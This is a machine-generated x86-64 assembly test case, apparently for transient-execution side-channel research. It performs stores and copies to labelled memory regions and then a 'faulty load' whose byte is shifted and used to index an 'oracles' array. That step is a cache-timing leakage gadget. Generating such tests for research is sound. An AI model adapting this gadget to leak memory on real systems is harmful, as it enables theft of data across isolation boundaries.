.global s_prepare_buffers
s_prepare_buffers:
ret

    .global s_faulty_load
s_faulty_load:
push %r10
push %r12
push %r15
push %r8
push %r9
push %rax
push %rbp
push %rcx
push %rdi
push %rsi

// Store
lea addresses_normal+0x10dbd, %r9
clflush (%r9)
nop
nop
nop
nop
inc %r10
mov $0x5152535455565758, %r12
movq %r12, (%r9)
dec %r15

// Store
lea addresses_D+0x19789, %rbp
nop
nop
nop
nop
nop
add $37417, %rax
mov $0x5152535455565758, %r12
movq %r12, %xmm7
movups %xmm7, (%rbp)
nop
nop
nop
nop
inc %r10

// REPMOV
lea addresses_A+0x50e3, %rsi
lea addresses_UC+0x2ba7, %rdi
nop
nop
nop
nop
nop
cmp %r15, %r15
mov $100, %rcx
rep movsb
nop
nop
nop
nop
and %rcx, %rcx

// Store
lea addresses_normal+0x10dbd, %rax
nop
xor $10350, %rdi
movl $0x51525354, (%rax)
nop
dec %r10

// REPMOV
lea addresses_D+0x957d, %rsi
lea addresses_PSE+0xdbbd, %rdi
nop
nop
nop
add $29953, %r9
mov $7, %rcx
rep movsq
nop
sub %rbp, %rbp

// Store
lea addresses_D+0x17c7d, %rdi
clflush (%rdi)
nop
nop
nop
nop
dec %rsi
movb $0x51, (%rdi)
nop
nop
nop
nop
nop
add $12337, %rdi

// Store
lea addresses_RW+0x1e65d, %r10
xor %rdi, %rdi
mov $0x5152535455565758, %rax
movq %rax, %xmm6
vmovntdq %ymm6, (%r10)
nop
xor %rdi, %rdi

// Store
lea addresses_A+0xfdad, %r10
nop
nop
and $30443, %rbp
mov $0x5152535455565758, %rax
movq %rax, (%r10)
nop
nop
nop
cmp $63630, %r8

// Store
lea addresses_A+0x1f5bd, %r15
nop
nop
cmp $55909, %rbp
movb $0x51, (%r15)
nop
nop
nop
nop
and %r12, %r12

// Store
lea addresses_WT+0x8fbd, %r12
nop
xor $2004, %rbp
movb $0x51, (%r12)
nop
nop
nop
xor %rbp, %rbp

// Faulty Load
lea addresses_normal+0x10dbd, %r9
nop
add %rcx, %rcx
mov (%r9), %ebp
lea oracles, %r12
and $0xff, %rbp
shlq $12, %rbp
mov (%r12,%rbp,1), %rbp
pop %rsi
pop %rdi
pop %rcx
pop %rbp
pop %rax
pop %r9
pop %r8
pop %r15
pop %r12
pop %r10
ret

/*
<gen_faulty_load>
[REF]
{'OP': 'LOAD', 'src': {'type': 'addresses_normal', 'size': 2, 'AVXalign': False, 'NT': False, 'congruent': 0, 'same': True}}
{'OP': 'STOR', 'dst': {'type': 'addresses_normal', 'size': 8, 'AVXalign': False, 'NT': False, 'congruent': 0, 'same': True}}
{'OP': 'STOR', 'dst': {'type': 'addresses_D', 'size': 16, 'AVXalign': False, 'NT': False, 'congruent': 2, 'same': False}}
{'OP': 'REPM', 'src': {'type': 'addresses_A', 'congruent': 1, 'same': False}, 'dst': {'type': 'addresses_UC', 'congruent': 1, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_normal', 'size': 4, 'AVXalign': False, 'NT': False, 'congruent': 0, 'same': True}}
{'OP': 'REPM', 'src': {'type': 'addresses_D', 'congruent': 5, 'same': False}, 'dst': {'type': 'addresses_PSE', 'congruent': 8, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_D', 'size': 1, 'AVXalign': False, 'NT': False, 'congruent': 5, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_RW', 'size': 32, 'AVXalign': False, 'NT': True, 'congruent': 4, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_A', 'size': 8, 'AVXalign': False, 'NT': False, 'congruent': 3, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_A', 'size': 1, 'AVXalign': False, 'NT': False, 'congruent': 8, 'same': False}}
{'OP': 'STOR', 'dst': {'type': 'addresses_WT', 'size': 1, 'AVXalign': False, 'NT': False, 'congruent': 7, 'same': False}}
[Faulty Load]
{'OP': 'LOAD', 'src': {'type': 'addresses_normal', 'size': 4, 'AVXalign': False, 'NT': False, 'congruent': 0, 'same': True}}
<gen_prepare_buffer>
{'54': 1}
54
*/
